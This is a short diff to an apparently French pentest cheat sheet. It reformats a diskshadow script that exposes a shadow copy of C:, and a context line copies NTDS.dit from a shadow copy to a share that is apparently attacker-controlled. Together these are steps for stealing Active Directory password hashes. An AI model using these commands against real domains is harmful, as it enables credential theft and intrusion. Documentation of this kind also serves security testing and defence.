@@ -33,16 +33,16 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<At
 
 ```shell
 diskshadow.exe
-DISKSHADOW> set verbose on
-DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
-DISKSHADOW> set context clientaccessible
-DISKSHADOW> set context persistent
-DISKSHADOW> begin backup
-DISKSHADOW> add volume C: alias cdrive
-DISKSHADOW> create
-DISKSHADOW> expose %cdrive% E:
-DISKSHADOW> end backup
-DISKSHADOW> exit
+ set verbose on
+ set metadata C:\Windows\Temp\meta.cab
+ set context clientaccessible
+ set context persistent
+ begin backup
+ add volume C: alias cdrive
+ create
+ expose %cdrive% E:
+ end backup
+ exit
 ```
 
 ##### Copier à partir du cliché instantanné
